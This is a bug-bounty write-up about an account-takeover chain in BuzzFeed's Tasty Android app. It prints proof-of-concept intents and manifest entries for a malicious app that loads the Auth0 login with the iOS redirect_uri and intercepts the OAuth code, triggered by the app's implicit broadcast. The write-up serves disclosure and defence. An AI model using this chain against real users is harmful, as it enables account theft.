# Account Takeover via OAuth Code Hijacking on BuzzFeed’s Tasty App

- **Source URL:** https://medium.com/@farouknapil/account-takeover-via-oauth-code-hijacking-on-buzzfeeds-tasty-app-chaining-webview-deeplinks-e2ff9a77b773?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@farouknapil
- **Fetched:** 2026-11-17
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 13539)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**Account Takeover via OAuth Code Hijacking on BuzzFeed’s Tasty App: Chaining WebView Exploits, Cross-Platform Deeplinks, and Implicit Broadcasts**

**How a rejected URL validation bypass pushed me to reverse-engineer an entire exploit chain and how the vendor “patched” it by accidentally creating a logic paradox.**

#### **Target Overview & Timeline**

Before diving into the technical exploit chain, here is a quick overview of the target and the timeline of the report:

- **Target Application:** [Tasty (by BuzzFeed)](https://play.google.com/store/apps/details?id=com.buzzfeed.tasty&hl=en)
- **What it does:** Tasty is a popular lifestyle and cooking application with over 10 million downloads, offering over 3,000 recipes, personalized meal recommendations, and step-by-step cooking videos.
- **Affected Version:** Android 1.85.0 (and 1.84.0)
- **Report Submitted:** September 27, 2023

If you spend enough time hunting for vulnerabilities in mobile applications, you quickly learn that the Android operating system is a playground of interconnected components. Intents, deep links, content providers, and broadcast receivers are constantly talking to each other. The real art of mobile bug hunting isn’t just finding a single misconfiguration; it’s chaining multiple low-impact primitives into a devastating attack.

In 2023, I was analyzing BuzzFeed’s Tasty App (Android **versions 1.84.0 and 1.85.0**). What started as a simple, medium impact WebView validation bug eventually escalated into a chained, completely silent Account Takeover (ATO) utilizing an iOS application’s OAuth flow on an Android device.

Here is the full story of how that chain was built, why the vendor closed it as “Informative,” and a deep dive into the bizarre way they eventually patched it.

**Phase 1: The Initial Find (Improper Host Validation)**

When an external app sends an intent to this LauncherActivity with the action android.intent.action.VIEW and a data URI, the activity passes that data to a class named t7.i for validation. If it passes, the URL is loaded into SimpleWebViewActivity.

When I decompiled and analyzed the validation logic in t7.i, I found a classic, textbook parsing flaw:

String authority2 = data.getAuthority();

if ((authority2 != null && kotlin.text.t.u(authority2, "tasty.co", false)) && data.getPathSegments() != null && data.getPathSegments().size() == 2) {

String lastPathSegment = data.getLastPathSegment();

String str9 = data.getPathSegments().get(0);

if (Intrinsics.a(str9, TargetContentType.RECIPE)) {

du.a.a(bm.l.f("Launching recipe page with slug: ", lastPathSegment), new Object\[0\]);

TastyMainActivity.c cVar8 = new TastyMainActivity.c();

com.buzzfeed.tasty.detail.recipe.g gVar4 = new com.buzzfeed.tasty.detail.recipe.g(new Bundle());

gVar4.g(lastPathSegment);

gVar4.d(data);

gVar4.f(uri);

cVar8.c(new jb.o(gVar4.f13004a));

intentArr = new Intent\[\]{cVar8.d(packageContext)};

} else if (Intrinsics.a(str9, TargetContentType.COMPILATION)) {

du.a.a(bm.l.f("Launching compilation page with slug: ", lastPathSegment), new Object\[0\]);

TastyMainActivity.c cVar9 = new TastyMainActivity.c();

hb.a aVar4 = new hb.a(new Bundle());

aVar4.g(lastPathSegment);

aVar4.d(data);

aVar4.f(uri);

cVar9.c(new jb.f(aVar4.f13004a));

intentArr = new Intent\[\]{cVar9.d(packageContext)};

} else {

du.a.a("Unable to handle the path: " + str9 + ". Launching url in browser. uri=" + data, new Object\[0\]);

intentArr2 = new Intent\[\]{S(data)};

}

} else {

du.a.a(w0.c("Unable to handle the web link. Launching url in browser. uri=", data), new Object\[0\]);

intentArr2 = new Intent\[\]{S(data)};

}

The vulnerability lies in how the application verifies the host. The code grabs the authority (hostname) of the incoming intent and uses a

kotlin.text.t.u(authority2, "tasty.co", false)

Kotlin text utility to check if it simply *contains* the string "tasty.co".

It does not check if the host *is exactly* tasty.co or a valid subdomain.

then the data send to method new Intent\[\]{S(data)};

```
public final Intent S(Uri uri) {
        SimpleWebViewActivity.a aVar = new SimpleWebViewActivity.a();
        aVar.f15342a.putString("KEY_URL", uri.toString());
        Application context = this.f32469d;
        Intrinsics.checkNotNullParameter(context, "context");
        Intent intent = new Intent(context, SimpleWebViewActivity.class);
        intent.putExtras(aVar.f15342a);
        return intent;
    }
```
This meant an attacker could register a domain like tasty.co.attacker.com or https://www.abtasty.com, pass it via an intent to the LauncherActivity, and the Tasty app would forcefully load the attacker's website inside its own trusted WebView.

To prove this, I wrote a simple PoC Android app:

```
Intent intent = new Intent("android.intent.action.VIEW");
intent.setClassName("com.buzzfeed.tasty","com.buzzfeed.tasty.LauncherActivity");
intent.setData(Uri.parse("http://tasty.co.localhost/poc.html"));
startActivity(intent);
```
When triggered, the Tasty app opened and loaded my HTML. This is a great vector for phishing credentials or payment info from a user who implicitly trusts the app context.

I submitted the report to their bug bounty program. A few days later, I received this response:

**Confirmed by an Android engineer, but we do not consider it a security issue since nothing is exposed. Installing a malicious app to mislead the user via our app would not benefit the hacker beyond what a malicious app could already do. Generally, issues affecting mobile applications require a hostile application installed on the same victim’s device in order to be exploited. Therefore, the main vector when it comes to mobile vulnerabilities is indeed a third-party app.**

i read *If you are able to leverage this into a practical exploitation scenario, we will be happy to reevaluate this report. so let’s leverage that.*

**Phase 2: The Pivot to OAuth and the iOS Discovery**

They closed the report because they felt forcing a WebView to load a URL wasn’t impactful enough on its own. I needed to find a way to elevate this primitive into something undeniable.

I turned my attention to the app’s authentication mechanism.

in The AndroidManifest.xml

\<activity android:exported="true" android:name="com.auth0.android.provider.RedirectActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar">

\<intent-filter android:autoVerify="true">

\<action android:name="android.intent.action.VIEW"/>

\<category android:name="android.intent.category.DEFAULT"/>

\<category android:name="android.intent.category.BROWSABLE"/>

\<data android:scheme="tasty2"/>

\<data android:host="auth.tasty.co" android:pathPrefix="/android/com.buzzfeed.tasty/callback" android:scheme="https"/>

\<data android:host="auth.stage.tasty.co" android:pathPrefix="/android/com.buzzfeed.tasty/callback" android:scheme="https"/>

\</intent-filter>

\</activity>

Tasty uses Auth0 for OAuth. When you click “Sign In,” it redirects you to an Auth0 URL containing standard parameters, including the callback.

This is A deep link which open the directly by link : tasty2://auth.tasty.co/android/com.buzzfeed.tasty/callback

when you click on sing in the app will take you to link like that:

https://auth.tasty.co/authorize?audience=https%3A%2F%2Fapi.tasty.co&scope=openid%20profile%20email%20offline\_access&response\_type=code....&redirect\_uri=tasty2%3A%2F%2Fauth.tasty.co%2Fandroid%2Fcom.buzzfeed.tasty%2Fcallback&state=t3E7tOyTRnHzvglSLNcGEVIqMrRbcBFp4JzBQIZzaBw

in the link you can see parameter called redirect\_uri and the value is

redirect\_uri=tasty2://auth.tasty.co/android/com.buzzfeed.tasty/callback

My immediate thought: What if I use my WebView exploit to force the app to load the Auth0 login page, but change the redirect\_uri to an attacker-controlled scheme? If the user is already logged into the Tasty app, Auth0 would automatically generate the authorization code and send it to my scheme, stealing the session.

I tried modifying the parameter, but Auth0 had strict whitelisting in place. It rejected any custom URIs I threw at it.

#### I was stuck.

But then I realized that modern mobile applications often share the same backend, Auth0 client IDs, and configurations across platforms. I downloaded the Tasty iOS app, intercepted the traffic during its registration process, and found the missing piece of the puzzle.

The iOS app used a completely different deep link for its callback: com.buzzfeed.tasty://auth.tasty.co/ios/com.buzzfeed.tasty/callback

**Phase 3: The Cross-Platform Bypass**

Because the Auth0 backend whitelisted *both* the Android and iOS redirect URIs for the same Client ID, the Android Auth0 login page would happily accept the iOS redirect\_uri if I injected it into the URL.

This was a massive breakthrough. It meant I could build a malicious Android app that registers the **iOS** deep link scheme:

\<activity

android:name=".MainActivity"

android:exported="true">

\<intent-filter>

\<action android:name="android.intent.action.MAIN" />

\<category android:name="android.intent.category.LAUNCHER" />

\</intent-filter>

\<intent-filter android:priority="999">

\<action android:name="android.intent.action.VIEW" />

\<category android:name="android.intent.category.DEFAULT" />

\<category android:name="android.intent.category.BROWSABLE" />

\<data

android:host="auth.tasty.co"

android:pathPrefix="/ios/com.buzzfeed.tasty/callback"

android:scheme="com.buzzfeed.tasty" />

\</intent-filter>

Since the legitimate Android Tasty app does not register the iOS scheme, my attacker app would be the *only* application on the Android device capable of handling that callback. There would be no “App Chooser” prompt to alert the victim. Complete, silent interception.

**Phase 4: Automating the Attack for a ATO**

Now I had all the primitives. I just had to chain them.

I used the **first vulnerability** (the rejected WebView Open Redirect) to force the Tasty app to load the Auth0 URL. But this time, I injected the iOS redirect\_uri I discovered in Phase 2.

```
Intent intent = new Intent("android.intent.action.VIEW");
intent.setClassName("com.buzzfeed.tasty","com.buzzfeed.tasty.LauncherActivity");
intent.setData(Uri.parse("https://auth.tasty.co/authorize?...&redirect_uri=com.buzzfeed.tasty%3A%2F%2Fauth.tasty.co%2Fios%2Fcom.buzzfeed.tasty%2Fcallback..."));
startActivity(intent);
```
**The logic:** When this intent fires, the Tasty app loads the Auth0 page. Then user authenticate, Auth0 instantly redirects the OAuth authorization code back to the iOS scheme deeplink. My malicious app catches it via the Intent Filter, and the account is compromised.

**Making it Silent:**

Requiring the attacker’s app to actively trigger the intent at a random time is noisy and unreliable. To make this attack practically invisible, I needed an event trigger.

While reversing the Tasty app further, I found that it broadcasts an implicit intent (com.buzzfeed.dustbuster.result) every single time the user performs an action within the application:

In n6.f You Will Find :

```
 try {
                ArrayList<String> arrayList3 = bVar.f17566b;
                Context context = this.f17558a;
                Intent intent = new Intent("com.buzzfeed.dustbuster.result");
                intent.putExtra("is_success", a10.f17569a);
                intent.putExtra("response_message", a10.f17570b);
                intent.putStringArrayListExtra("keys_sent", arrayList3);
                context.sendBroadcast(intent);
            } catch (Exception e11) {
                e = e11;
                eu.a.d(e, "exception in httpClient.post()", new Object[0]);
                Context context2 = this.f17558a;
                Intent intent2 = new Intent("com.buzzfeed.dustbuster.result");
                intent2.putExtra("is_success", false);
                intent2.putExtra("response_message", "exception in httpClient.post()");
                intent2.putExtra("keys_sent", new ArrayList());
                context2.sendBroadcast(intent2);
```
The application sends implicit broadcast It contains event\_uuid(keys\_sent) that it sends to the dustbuster server whenever the user does any action in the application We can create a receiver that receives this broadcast and fires the attack whenever the user does any action in the application

\<receiver

android:name=".MyReceiver"

android:enabled="true"

android:exported="true">

\<intent-filter android:priority="999">

\<action android:name="com.buzzfeed.dustbuster.result"/>

\</intent-filter>

\</receiver>

When he receives The broadcast he can fires our attack.

**The Final Automated Flow:**

- **Prerequisite 1:** The victim has the malicious PoC app installed (which requests absolutely **zero** dangerous Android permissions).

1. The victim opens the Tasty app and interacts with it normally.
2. Tasty automatically fires the dustbuster.result broadcast in the background.
3. The malicious app wakes up, catches the broadcast, and fires the WebView exploit intent.
4. Tasty forcefully loads the Auth0 URL with the iOS callback.
5. When the user logged in, Auth0 automatically generates the code and bounces it to the iOS scheme.
6. The malicious app intercepts the code entirely in the background. **Account Takeover complete.**

### **The PoC Video:**

### **The Attack Diagram Flow:**

### The Conclusion: Still “Informative”

I submitted the newly chained exploit. It bypassed their URL validation, abused a cross-platform misconfiguration in their OAuth whitelist, and leaked the authorization code silently via an implicit broadcast.

The response from the engineering team?

Confirmed by an Android engineer, but we do not consider it a security issue since nothing is exposed… Generally, issues affecting mobile applications require a hostile application installed on the same victim’s device in order to be exploited. Therefore, the main vector when it comes to mobile vulnerabilities is indeed a third-party app.

**Closed as Informative.**

This highlights a massive disconnect in how some vendors view mobile threat models. The Android sandbox exists specifically to prevent malicious apps from reading the data of other apps. My PoC required no permissions no storage, no accessibility, no camera. It utilized the Tasty app’s own internal logic flaws to hijack the session. If an application’s security posture relies on the assumption that “any installed third-party app means the device is entirely compromised,” they are ignoring the fundamental architecture of the Android OS.

### Epilogue: The 2026 Patch and the Logic Paradox

Fast forward to today. Out of curiosity, I recently pulled the latest APK to see if they ever actually fixed the underlying WebView validation flaw.

When I decompiled the new code, I found this updated logic:

```
if ((URLUtil.isHttpsUrl(uri2) || URLUtil.isHttpUrl(uri2)) && kotlin.text.t.s(authority, "tasty.co", false)) {
    Intrinsics.checkNotNullParameter(data, "<this>");
    String authority2 = data.getAuthority();
    
    if (authority2 == null || !kotlin.text.t.s(authority2, "tasty.co", false)) {
        // Loads arbitrary URL in SimpleWebViewActivity
        Intent intent2 = new Intent(context, (Class<?>) SimpleWebViewActivity.class);
        // ...
    } else {
        // Native handling for recipes/compilations, or launches HOME
    }
}
```
Instead of properly implementing strict host validation (e.g., authority.equals("tasty.co")), the developers added a new outer if wrapper.

Let’s look at what this code actually does:

1. The outer loop requires that the authority **DOES contain** "tasty.co".
2. The inner loop requires that the exact same authority (authority2) **DOES NOT contain** "tasty.co" to launch the SimpleWebViewActivity.

Because a string cannot simultaneously contain and *not* contain "tasty.co", **they accidentally created a logical paradox.** The execution block that loads the WebView is now completely unreachable (Dead Code).

If you send the old bypass payload (http://tasty.co.localhost)), the outer check passes, the inner check fails, and the app simply drops to the else block, which safely launches the native Home screen.

They technically mitigated the vulnerability not by properly securing the WebView, but by accidentally barricading the door to it entirely.

Except… if you find another way to force the WebView to load the URL again. Maybe by finding another vulnerability in the app!
